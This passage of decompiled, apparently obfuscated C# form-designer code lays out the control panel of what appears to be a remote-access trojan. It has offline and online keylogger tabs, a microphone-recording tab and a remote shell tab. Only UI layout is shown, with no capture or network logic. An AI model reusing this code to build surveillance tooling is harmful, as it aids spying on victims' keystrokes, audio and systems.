        this.vmethod_712().TabIndex = 0x34;
        this.vmethod_712().Text = "Get logs";
        this.vmethod_712().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_712().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_712().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_712().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_712().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_712().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_712().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_712().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_704().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_704().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_704().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_704().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_704().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_704().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_704().Border.HoverVisible = true;
        this.vmethod_704().Border.Rounding = 6;
        this.vmethod_704().Border.Thickness = 1;
        this.vmethod_704().Border.Type = ShapeTypes.Rounded;
        this.vmethod_704().Border.Visible = true;
        this.vmethod_704().DialogResult = DialogResult.None;
        this.vmethod_704().Enabled = false;
        this.vmethod_704().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_704().Image = null;
        this.vmethod_704().Location = new Point(0x100, 3);
        this.vmethod_704().MouseState = MouseStates.Normal;
        this.vmethod_704().Name = "btnKeylogOfflineDeleteAll";
        this.vmethod_704().Size = new Size(0x3e, 0x13);
        this.vmethod_704().TabIndex = 50;
        this.vmethod_704().Text = "Delete all";
        this.vmethod_704().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_704().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_704().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_704().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_704().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_704().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_704().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_704().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_702().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_702().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_702().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_702().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_702().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_702().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_702().Border.HoverVisible = true;
        this.vmethod_702().Border.Rounding = 6;
        this.vmethod_702().Border.Thickness = 1;
        this.vmethod_702().Border.Type = ShapeTypes.Rounded;
        this.vmethod_702().Border.Visible = true;
        this.vmethod_702().DialogResult = DialogResult.None;
        this.vmethod_702().Enabled = false;
        this.vmethod_702().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_702().Image = null;
        this.vmethod_702().Location = new Point(0xbc, 3);
        this.vmethod_702().MouseState = MouseStates.Normal;
        this.vmethod_702().Name = "btnKeylogOfflineViewAll";
        this.vmethod_702().Size = new Size(0x3e, 0x13);
        this.vmethod_702().TabIndex = 0x31;
        this.vmethod_702().Text = "View all";
        this.vmethod_702().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_702().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_702().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_702().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_702().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_702().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_702().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_702().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_556().set_BackColor(SystemColors.Control);
        this.vmethod_556().set_CircleWidth(20f);
        this.vmethod_556().set_GetAnimationColor(Color.DeepSkyBlue);
        this.vmethod_556().set_GetAnimationSpeed(100);
        this.vmethod_556().set_GetBaseColor(Color.SkyBlue);
        this.vmethod_556().Location = new Point(0x1c8, 0xc6);
        this.vmethod_556().MinimumSize = new Size(80, 80);
        this.vmethod_556().Name = "pbKeylogSplash";
        this.vmethod_556().set_NumberOfCircles(45f);
        this.vmethod_556().set_Radian(180.0);
        this.vmethod_556().Size = new Size(0xa1, 0xa1);
        this.vmethod_556().set_Smoothing(SmoothingMode.HighQuality);
        this.vmethod_556().TabIndex = 0x2f;
        this.vmethod_556().Visible = false;
        this.vmethod_482().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_482().AutoSize = false;
        this.vmethod_482().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_482().Dock = DockStyle.None;
        this.vmethod_482().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray25 = new ToolStripItem[] { this.vmethod_484(), this.vmethod_486(), this.vmethod_488(), this.vmethod_490(), this.vmethod_492() };
        this.vmethod_482().Items.AddRange(itemArray25);
        this.vmethod_482().Location = new Point(2, 0x20b);
        this.vmethod_482().Name = "ssKeylogOffline";
        this.vmethod_482().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_482().Size = new Size(0x3cc, 20);
        this.vmethod_482().SizingGrip = false;
        this.vmethod_482().Stretch = false;
        this.vmethod_482().TabIndex = 0x22;
        this.vmethod_482().Text = "stStatus";
        this.vmethod_484().AutoSize = false;
        this.vmethod_484().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_484().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_484().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_484().Name = "tsKeylogOfflineLogs";
        this.vmethod_484().Size = new Size(0xb7, 0x12);
        this.vmethod_484().Text = "Logs: N/A";
        this.vmethod_484().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_486().AutoSize = false;
        this.vmethod_486().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_486().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_486().Font = new Font("Segoe UI", 9f);
        this.vmethod_486().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_486().Name = "tsKeylogOfflineSize";
        this.vmethod_486().Size = new Size(230, 0x12);
        this.vmethod_486().Text = "Current log size: N/A";
        this.vmethod_486().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_488().AutoSize = false;
        this.vmethod_488().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_488().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_488().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_488().Name = "tsKeylogOfflineStartDate";
        this.vmethod_488().Size = new Size(0xde, 0x12);
        this.vmethod_488().Text = "Creation date: N/A";
        this.vmethod_488().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_490().AutoSize = false;
        this.vmethod_490().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_490().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_490().Margin = new Padding(0, 2, 0, 2);
        this.vmethod_490().Name = "tsKeylogOfflineEndDate";
        this.vmethod_490().Size = new Size(0xe9, 0x10);
        this.vmethod_490().Spring = true;
        this.vmethod_490().Text = "Last updated: N/A";
        this.vmethod_490().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_492().Alignment = ToolStripItemAlignment.Right;
        this.vmethod_492().ForeColor = Color.FromArgb(0xc0, 0xc0, 0);
        this.vmethod_492().Margin = new Padding(2, 3, -6, 2);
        this.vmethod_492().Name = "pbKeylogOfflineProgress";
        this.vmethod_492().Size = new Size(100, 15);
        this.vmethod_492().Step = 1;
        this.vmethod_492().Style = ProgressBarStyle.Continuous;
        this.vmethod_386().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Top;
        this.vmethod_386().BackColor = Color.Transparent;
        this.vmethod_386().Location = new Point(0x191, 4);
        this.vmethod_386().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_386().Name = "lblKeylogOfflineLog";
        this.vmethod_386().Size = new Size(0x23c, 0x13);
        this.vmethod_386().TabIndex = 0x21;
        this.vmethod_386().Text = "Current log: N/A";
        this.vmethod_386().TextAlign = ContentAlignment.MiddleCenter;
        this.vmethod_390().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray26 = new ToolStripItem[] { this.vmethod_392(), this.vmethod_814(), this.vmethod_394() };
        this.vmethod_390().Items.AddRange(itemArray26);
        this.vmethod_390().Name = "cmsKeylogOfflineList";
        this.vmethod_390().Size = new Size(0x6c, 0x36);
        this.vmethod_392().Name = "ViewLogToolStripMenuItem";
        this.vmethod_392().Size = new Size(0x6b, 0x16);
        this.vmethod_392().Text = "View";
        this.vmethod_814().Name = "ToolStripMenuItem41";
        this.vmethod_814().Size = new Size(0x68, 6);
        this.vmethod_394().Name = "DeleteToolStripMenuItem2";
        this.vmethod_394().Size = new Size(0x6b, 0x16);
        this.vmethod_394().Text = "Delete";
        this.vmethod_280().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_280().Enabled = false;
        this.vmethod_280().Location = new Point(0xbc, 0x1a);
        this.vmethod_280().Margin = new Padding(2);
        this.vmethod_280().Name = "rtKeylogOffline";
        this.vmethod_280().ScrollBars = RichTextBoxScrollBars.Vertical;
        this.vmethod_280().Size = new Size(0x312, 0x1f0);
        this.vmethod_280().TabIndex = 0;
        this.vmethod_280().Text = string.Empty;
        this.vmethod_284().Controls.Add(this.vmethod_818());
        this.vmethod_284().Controls.Add(this.vmethod_706());
        this.vmethod_284().Controls.Add(this.vmethod_476());
        this.vmethod_284().Controls.Add(this.vmethod_286());
        this.vmethod_284().Location = new Point(4, 5);
        this.vmethod_284().Margin = new Padding(2);
        this.vmethod_284().Name = "tbKeylogOnline";
        this.vmethod_284().Padding = new Padding(2);
        this.vmethod_284().Size = new Size(0x3d0, 0x221);
        this.vmethod_284().TabIndex = 6;
        this.vmethod_284().Text = "Online keylogger";
        this.vmethod_284().UseVisualStyleBackColor = true;
        this.vmethod_706().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_706().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_706().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_706().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_706().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_706().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_706().Border.HoverVisible = true;
        this.vmethod_706().Border.Rounding = 6;
        this.vmethod_706().Border.Thickness = 1;
        this.vmethod_706().Border.Type = ShapeTypes.Rounded;
        this.vmethod_706().Border.Visible = true;
        this.vmethod_706().DialogResult = DialogResult.None;
        this.vmethod_706().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_706().Image = null;
        this.vmethod_706().Location = new Point(3, 3);
        this.vmethod_706().MouseState = MouseStates.Normal;
        this.vmethod_706().Name = "btnKeylogOnlineStartStop";
        this.vmethod_706().Size = new Size(0x3e, 0x13);
        this.vmethod_706().TabIndex = 0x31;
        this.vmethod_706().Text = "Start";
        this.vmethod_706().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_706().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_706().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_706().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_706().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_706().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_706().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_706().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_476().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_476().AutoSize = false;
        this.vmethod_476().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_476().Dock = DockStyle.None;
        this.vmethod_476().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray27 = new ToolStripItem[] { this.vmethod_478(), this.vmethod_480() };
        this.vmethod_476().Items.AddRange(itemArray27);
        this.vmethod_476().Location = new Point(2, 0x20b);
        this.vmethod_476().Name = "ssKeylogOnline";
        this.vmethod_476().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_476().Size = new Size(0x3cc, 20);
        this.vmethod_476().SizingGrip = false;
        this.vmethod_476().Stretch = false;
        this.vmethod_476().TabIndex = 0x1f;
        this.vmethod_476().Text = "stStatus";
        this.vmethod_478().AutoSize = false;
        this.vmethod_478().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_478().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_478().Font = new Font("Segoe UI", 9f);
        this.vmethod_478().Margin = new Padding(0, 3, 0, 0);
        this.vmethod_478().Name = "tsKeylogOnlineDuration";
        this.vmethod_478().Size = new Size(250, 0x11);
        this.vmethod_478().Text = "Duration: N/A";
        this.vmethod_478().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_480().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_480().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_480().Margin = new Padding(0, 3, -6, 0);
        this.vmethod_480().Name = "tsKeylogOnlineStatus";
        this.vmethod_480().Size = new Size(720, 0x11);
        this.vmethod_480().Spring = true;
        this.vmethod_480().Text = "Status: Disabled";
        this.vmethod_480().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_286().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_286().Enabled = false;
        this.vmethod_286().Location = new Point(2, 0x1a);
        this.vmethod_286().Margin = new Padding(2);
        this.vmethod_286().Name = "rtKeylogOnline";
        this.vmethod_286().ReadOnly = true;
        this.vmethod_286().ScrollBars = RichTextBoxScrollBars.Vertical;
        this.vmethod_286().Size = new Size(0x3cc, 0x1f1);
        this.vmethod_286().TabIndex = 1;
        this.vmethod_286().Text = string.Empty;
        this.vmethod_300().Controls.Add(this.vmethod_694());
        this.vmethod_300().Controls.Add(this.vmethod_692());
        this.vmethod_300().Controls.Add(this.vmethod_330());
        this.vmethod_300().Controls.Add(this.vmethod_326());
        this.vmethod_300().Controls.Add(this.vmethod_328());
        this.vmethod_300().Controls.Add(this.vmethod_318());
        this.vmethod_300().Controls.Add(this.vmethod_320());
        this.vmethod_300().Controls.Add(this.vmethod_322());
        this.vmethod_300().Controls.Add(this.vmethod_302());
        this.vmethod_300().Controls.Add(this.vmethod_304());
        this.vmethod_300().Controls.Add(this.vmethod_306());
        this.vmethod_300().Controls.Add(this.vmethod_308());
        this.vmethod_300().Controls.Add(this.vmethod_316());
        this.vmethod_300().Location = new Point(4, 5);
        this.vmethod_300().Margin = new Padding(2);
        this.vmethod_300().Name = "tbAudio";
        this.vmethod_300().Padding = new Padding(2);
        this.vmethod_300().Size = new Size(0x3d0, 0x221);
        this.vmethod_300().TabIndex = 7;
        this.vmethod_300().Text = "Audio";
        this.vmethod_300().UseVisualStyleBackColor = true;
        this.vmethod_694().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_694().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_694().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_694().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_694().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_694().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_694().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_694().Border.HoverVisible = true;
        this.vmethod_694().Border.Rounding = 6;
        this.vmethod_694().Border.Thickness = 1;
        this.vmethod_694().Border.Type = ShapeTypes.Rounded;
        this.vmethod_694().Border.Visible = true;
        this.vmethod_694().DialogResult = DialogResult.None;
        this.vmethod_694().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_694().Image = null;
        this.vmethod_694().Location = new Point(0x395, 12);
        this.vmethod_694().MouseState = MouseStates.Normal;
        this.vmethod_694().Name = "btAudioRefresh";
        this.vmethod_694().Size = new Size(0x39, 0x11);
        this.vmethod_694().TabIndex = 0x2a;
        this.vmethod_694().TabStop = false;
        this.vmethod_694().Text = "Refresh";
        this.vmethod_694().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_694().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_694().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_694().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_694().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_694().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_694().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_694().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_692().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_692().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_692().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_692().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_692().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_692().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_692().Border.HoverVisible = true;
        this.vmethod_692().Border.Rounding = 6;
        this.vmethod_692().Border.Thickness = 1;
        this.vmethod_692().Border.Type = ShapeTypes.Rounded;
        this.vmethod_692().Border.Visible = true;
        this.vmethod_692().DialogResult = DialogResult.None;
        this.vmethod_692().Enabled = false;
        this.vmethod_692().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_692().Image = null;
        this.vmethod_692().Location = new Point(5, 7);
        this.vmethod_692().MouseState = MouseStates.Normal;
        this.vmethod_692().Name = "btAudioStartStop";
        this.vmethod_692().Size = new Size(0x3f, 0x1a);
        this.vmethod_692().TabIndex = 0x22;
        this.vmethod_692().TabStop = false;
        this.vmethod_692().Text = "Start";
        this.vmethod_692().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_692().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_692().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_692().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_692().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_692().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_692().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_692().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_330().AutoSize = true;
        this.vmethod_330().BackColor = Color.Transparent;
        this.vmethod_330().Checked = true;
        this.vmethod_330().CheckState = CheckState.Checked;
        this.vmethod_330().Enabled = false;
        this.vmethod_330().ForeColor = Color.Black;
        this.vmethod_330().Location = new Point(0x1d1, 12);
        this.vmethod_330().Margin = new Padding(2);
        this.vmethod_330().Name = "chkAudioAutoplay";
        this.vmethod_330().Size = new Size(0x6c, 0x11);
        this.vmethod_330().TabIndex = 0x29;
        this.vmethod_330().Text = "Autoplay samples";
        this.vmethod_330().UseVisualStyleBackColor = false;
        this.vmethod_326().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_326().BackColor = Color.White;
        this.vmethod_326().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_326().Enabled = false;
        this.vmethod_326().ForeColor = Color.Black;
        this.vmethod_326().FormattingEnabled = true;
        this.vmethod_326().Location = new Point(0x2b0, 11);
        this.vmethod_326().Margin = new Padding(2);
        this.vmethod_326().Name = "cbAudioDevices";
        this.vmethod_326().Size = new Size(0xe2, 0x15);
        this.vmethod_326().TabIndex = 0x27;
        this.vmethod_328().Anchor = AnchorStyles.Right | AnchorStyles.Top;
        this.vmethod_328().AutoSize = true;
        this.vmethod_328().BackColor = Color.Transparent;
        this.vmethod_328().ForeColor = Color.Black;
        this.vmethod_328().Location = new Point(0x281, 13);
        this.vmethod_328().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_328().Name = "lblAudioDevices";
        this.vmethod_328().Size = new Size(0x2c, 13);
        this.vmethod_328().TabIndex = 0x26;
        this.vmethod_328().Text = "Device:";
        this.vmethod_318().AutoSize = true;
        this.vmethod_318().BackColor = Color.Transparent;
        this.vmethod_318().ForeColor = Color.Black;
        this.vmethod_318().Location = new Point(0x183, 13);
        this.vmethod_318().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_318().Name = "lblAudioSec";
        this.vmethod_318().Size = new Size(0x1a, 13);
        this.vmethod_318().TabIndex = 0x25;
        this.vmethod_318().Text = "Sec";
        this.vmethod_320().BackColor = Color.White;
        this.vmethod_320().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_320().Enabled = false;
        this.vmethod_320().ForeColor = Color.Black;
        this.vmethod_320().FormattingEnabled = true;
        this.vmethod_320().Location = new Point(0x152, 11);
        this.vmethod_320().Margin = new Padding(2);
        this.vmethod_320().Name = "cbAudioDuration";
        this.vmethod_320().Size = new Size(0x2f, 0x15);
        this.vmethod_320().TabIndex = 0x24;
        this.vmethod_322().AutoSize = true;
        this.vmethod_322().BackColor = Color.Transparent;
        this.vmethod_322().ForeColor = Color.Black;
        this.vmethod_322().Location = new Point(0xf6, 13);
        this.vmethod_322().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_322().Name = "lblAudioDuration";
        this.vmethod_322().Size = new Size(0x56, 13);
        this.vmethod_322().TabIndex = 0x23;
        this.vmethod_322().Text = "Sample duration:";
        this.vmethod_302().AutoSize = true;
        this.vmethod_302().BackColor = Color.Transparent;
        this.vmethod_302().ForeColor = Color.Black;
        this.vmethod_302().Location = new Point(0xd6, 13);
        this.vmethod_302().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_302().Name = "lblAudioHZ";
        this.vmethod_302().Size = new Size(20, 13);
        this.vmethod_302().TabIndex = 0x22;
        this.vmethod_302().Text = "Hz";
        this.vmethod_304().BackColor = Color.White;
        this.vmethod_304().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_304().Enabled = false;
        this.vmethod_304().ForeColor = Color.Black;
        this.vmethod_304().FormattingEnabled = true;
        this.vmethod_304().Location = new Point(0x8d, 11);
        this.vmethod_304().Margin = new Padding(2);
        this.vmethod_304().Name = "cbAudioSamplerate";
        this.vmethod_304().Size = new Size(0x47, 0x15);
        this.vmethod_304().TabIndex = 0x21;
        this.vmethod_306().AutoSize = true;
        this.vmethod_306().BackColor = Color.Transparent;
        this.vmethod_306().ForeColor = Color.Black;
        this.vmethod_306().Location = new Point(0x4b, 13);
        this.vmethod_306().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_306().Name = "lblAudioSamplerate";
        this.vmethod_306().Size = new Size(0x42, 13);
        this.vmethod_306().TabIndex = 0x20;
        this.vmethod_306().Text = "Sample rate:";
        this.vmethod_308().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_308().AutoSize = false;
        this.vmethod_308().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_308().Dock = DockStyle.None;
        this.vmethod_308().ImageScalingSize = new Size(0x1c, 0x1c);
        ToolStripItem[] itemArray28 = new ToolStripItem[] { this.vmethod_314(), this.vmethod_310(), this.vmethod_312() };
        this.vmethod_308().Items.AddRange(itemArray28);
        this.vmethod_308().Location = new Point(2, 0x20b);
        this.vmethod_308().Name = "ssAudio";
        this.vmethod_308().Padding = new Padding(1, 0, 7, 0);
        this.vmethod_308().Size = new Size(0x3cc, 20);
        this.vmethod_308().SizingGrip = false;
        this.vmethod_308().Stretch = false;
        this.vmethod_308().TabIndex = 30;
        this.vmethod_308().Text = "stStatus";
        this.vmethod_314().AutoSize = false;
        this.vmethod_314().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_314().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_314().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_314().Name = "tsAudioDuration";
        this.vmethod_314().Size = new Size(250, 0x12);
        this.vmethod_314().Text = "Duration: N/A";
        this.vmethod_314().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_310().AutoSize = false;
        this.vmethod_310().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_310().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_310().Margin = new Padding(0, 2, 0, 0);
        this.vmethod_310().Name = "tsAudioSamples";
        this.vmethod_310().Size = new Size(200, 0x12);
        this.vmethod_310().Text = "Samples: N/A";
        this.vmethod_310().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_312().AutoSize = false;
        this.vmethod_312().BorderSides = ToolStripStatusLabelBorderSides.All;
        this.vmethod_312().BorderStyle = Border3DStyle.SunkenOuter;
        this.vmethod_312().Margin = new Padding(0, 2, -6, 0);
        this.vmethod_312().Name = "tsAudioSelected";
        this.vmethod_312().Overflow = ToolStripItemOverflow.Never;
        this.vmethod_312().Size = new Size(520, 0x12);
        this.vmethod_312().Spring = true;
        this.vmethod_312().Text = "Selected: N/A";
        this.vmethod_312().TextAlign = ContentAlignment.TopLeft;
        this.vmethod_332().BackColor = Color.FromArgb(0xeb, 0xed, 0xef);
        this.vmethod_332().ImageScalingSize = new Size(0x18, 0x18);
        ToolStripItem[] itemArray29 = new ToolStripItem[] { this.vmethod_344(), this.vmethod_346(), this.vmethod_334(), this.vmethod_336(), this.vmethod_338() };
        this.vmethod_332().Items.AddRange(itemArray29);
        this.vmethod_332().Name = "cmsInfo";
        this.vmethod_332().Size = new Size(0x66, 0x52);
        this.vmethod_344().Name = "PlayToolStripMenuItem";
        this.vmethod_344().Size = new Size(0x65, 0x16);
        this.vmethod_344().Text = "Play";
        this.vmethod_346().Name = "ToolStripMenuItem14";
        this.vmethod_346().Size = new Size(0x62, 6);
        this.vmethod_334().Name = "SaveToolStripMenuItem";
        this.vmethod_334().Size = new Size(0x65, 0x16);
        this.vmethod_334().Text = "Save";
        this.vmethod_336().Name = "ToolStripMenuItem13";
        this.vmethod_336().Size = new Size(0x62, 6);
        this.vmethod_338().Name = "ClearToolStripMenuItem";
        this.vmethod_338().Size = new Size(0x65, 0x16);
        this.vmethod_338().Text = "Clear";
        this.vmethod_350().Controls.Add(this.vmethod_710());
        this.vmethod_350().Controls.Add(this.vmethod_510());
        this.vmethod_350().Controls.Add(this.vmethod_352());
        this.vmethod_350().Location = new Point(4, 5);
        this.vmethod_350().Margin = new Padding(2);
        this.vmethod_350().Name = "tbShell";
        this.vmethod_350().Padding = new Padding(2);
        this.vmethod_350().Size = new Size(0x3d0, 0x221);
        this.vmethod_350().TabIndex = 8;
        this.vmethod_350().Text = "Shell";
        this.vmethod_350().UseVisualStyleBackColor = true;
        this.vmethod_710().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_710().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_710().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_710().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_710().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_710().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_710().Border.HoverVisible = true;
        this.vmethod_710().Border.Rounding = 6;
        this.vmethod_710().Border.Thickness = 1;
        this.vmethod_710().Border.Type = ShapeTypes.Rounded;
        this.vmethod_710().Border.Visible = true;
        this.vmethod_710().DialogResult = DialogResult.None;
        this.vmethod_710().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_710().Image = null;
        this.vmethod_710().Location = new Point(1, 7);
        this.vmethod_710().MouseState = MouseStates.Normal;
        this.vmethod_710().Name = "btShellStartStop";
        this.vmethod_710().Size = new Size(0x3e, 0x18);
        this.vmethod_710().TabIndex = 0x2b;
        this.vmethod_710().Text = "Start";
        this.vmethod_710().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_710().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_710().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_710().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_710().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_710().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_710().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_710().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
